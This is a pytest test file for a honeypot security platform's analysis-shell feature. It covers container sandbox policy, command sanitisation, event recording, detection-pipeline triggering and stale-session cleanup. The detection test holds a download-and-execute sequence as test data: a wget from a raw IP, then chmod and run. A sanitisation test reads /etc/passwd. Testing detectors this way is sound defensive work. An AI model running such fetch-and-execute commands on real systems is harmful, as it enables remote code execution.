"""Analysis Lab — sandbox policy, command capture, pipeline wiring."""

from datetime import datetime, timedelta

import pytest
from sqlalchemy import select

from app.models.all_models import (
    AnalysisSession,
    Detection,
    Incident,
    NormalizedEventModel,
    RawEventModel,
)
from app.services import analysis_shell, container_manager, detection_engine
from app.services.container_manager import ContainerPolicyError


# ── container policy ──────────────────────────────────────────────────────
def _ok_analysis_kwargs(**over):
    base = dict(
        name="shadowtrust-shell-abc123def456",
        network=container_manager.ANALYSIS_NETWORK,
        user="analyst",
        mem_limit="512m",
        nano_cpus=1_000_000_000,
        pids_limit=128,
        cap_drop=["ALL"],
        security_opt=["no-new-privileges:true"],
        labels={
            container_manager.MANAGED_LABEL: "true",
            container_manager.KIND_LABEL: "analysis-shell",
            container_manager.SESSION_LABEL: "s1",
            container_manager.OWNER_LABEL: "a@x",
        },
    )
    base.update(over)
    return base


IMG = sorted(container_manager.ALLOWED_ANALYSIS_IMAGES)[0]


def test_valid_analysis_run_passes():
    container_manager.validate_analysis_run(IMG, _ok_analysis_kwargs())


@pytest.mark.parametrize("bad", [
    dict(network="honeynet_app"),
    dict(volumes={"/etc": {}}),
    dict(privileged=True),
    dict(cap_drop=[]),
    dict(cap_add=["NET_ADMIN"]),
    dict(security_opt=[]),
    dict(user="root"),
    dict(user="0"),
    dict(mem_limit="4g"),
    dict(pids_limit=None),
    dict(name="pwn"),
    dict(labels={container_manager.MANAGED_LABEL: "true"}),
])
def test_analysis_run_rejections(bad):
    with pytest.raises(ContainerPolicyError):
        container_manager.validate_analysis_run(IMG, _ok_analysis_kwargs(**bad))


def test_analysis_image_not_a_lab_image():
    with pytest.raises(ContainerPolicyError):
        container_manager.validate_analysis_run("evil/x", _ok_analysis_kwargs())


class _Unmanaged:
    name = "honeynet_cowrie"
    labels = {}


def test_exec_and_attach_guard_unmanaged():
    with pytest.raises(ContainerPolicyError):
        container_manager.exec_in_managed(_Unmanaged(), ["id"])
    with pytest.raises(ContainerPolicyError):
        container_manager.attach_shell(_Unmanaged())


# ── command sanitisation ─────────────────────────────────────────────────
def test_clean_command_strips_ansi_and_control():
    assert analysis_shell._clean_command("\x1b[31mwhoami\x1b[0m") == "whoami"
    assert analysis_shell._clean_command("ls\x07 -la\r\n") == "ls -la"   # bell removed
    assert analysis_shell._clean_command("cat  /etc/passwd") == "cat  /etc/passwd"
    assert analysis_shell._clean_command("   ") == ""


def test_source_tag():
    assert analysis_shell.source_tag("a@x.com") == "analyst-shell:a@x.com"


# ── synthetic event shape ────────────────────────────────────────────────
def test_synthetic_event_keys_are_real_orm_attrs(soc_db):
    run, factory = soc_db

    async def _go():
        async with factory() as db:
            s = AnalysisSession(session_id="sess1", owner="a@x", source_tag="analyst-shell:a@x",
                                status="running", started_at=datetime.utcnow(),
                                last_activity_at=datetime.utcnow())
            db.add(s)
            await db.flush()
            await analysis_shell._emit_event(
                db, s, sensor_event_type="shell.command.input", command="whoami"
            )
            await db.commit()
            ne = (await db.execute(select(NormalizedEventModel))).scalars().all()
            re_ = (await db.execute(select(RawEventModel))).scalars().all()
            return ne, re_
    ne, re_ = run(_go())
    assert len(ne) == 1 and len(re_) == 1
    assert ne[0].sensor == "analysis-shell"
    assert ne[0].source_ip == "analyst-shell:a@x"
    assert re_[0].honeypot_type == "AnalysisShell"
    assert ne[0].event_id == re_[0].id


# ── flows through the detection pipeline ─────────────────────────────────
def test_recorded_command_triggers_detection_and_incident(soc_db):
    run, factory = soc_db

    async def _go():
        async with factory() as db:
            s = AnalysisSession(session_id="sess2", owner="an@x", source_tag="analyst-shell:an@x",
                                status="running", started_at=datetime.utcnow(),
                                last_activity_at=datetime.utcnow())
            db.add(s)
            await db.flush()
            await analysis_shell.record_command(db, s, "cd /tmp; wget http://185.99.1.7/x.sh -O x.sh")
            await analysis_shell.record_command(db, s, "chmod +x x.sh; ./x.sh")
            await detection_engine.run_cycle(db)
            dets = (await db.execute(select(Detection))).scalars().all()
            incs = (await db.execute(select(Incident))).scalars().all()
            return dets, incs
    dets, incs = run(_go())
    assert any(d.rule_id == "st-exec-004" for d in dets)
    d = next(d for d in dets if d.rule_id == "st-exec-004")
    assert d.source_ip == "analyst-shell:an@x"
    assert d.attack_technique == "T1105"
    assert len(incs) == 1
    assert incs[0].correlation_key == "analyst-shell:an@x"


# ── reaper ───────────────────────────────────────────────────────────────
def test_reap_stale_tears_down_idle_sessions(soc_db, monkeypatch):
    run, factory = soc_db
    calls = {"stop": 0}
    monkeypatch.setattr(container_manager, "find_session_container", lambda sid, client=None: object())
    monkeypatch.setattr(container_manager, "stop_and_remove_managed", lambda c: calls.__setitem__("stop", calls["stop"] + 1))

    async def _go():
        async with factory() as db:
            old = datetime.utcnow() - timedelta(minutes=90)
            db.add(AnalysisSession(session_id="idle", owner="a@x", source_tag="t",
                                   status="running", started_at=old, last_activity_at=old,
                                   ttl_minutes=20))
            db.add(AnalysisSession(session_id="fresh", owner="b@x", source_tag="t2",
                                   status="running", started_at=datetime.utcnow(),
                                   last_activity_at=datetime.utcnow(), ttl_minutes=20))
            await db.commit()
            res = await analysis_shell.reap_stale(db)
            rows = {r.session_id: r.status for r in
                    (await db.execute(select(AnalysisSession))).scalars().all()}
            return res, rows
    res, rows = run(_go())
    assert res["reaped"] == 1
    assert rows["idle"] == "stopped" and rows["fresh"] == "running"
    assert calls["stop"] == 1
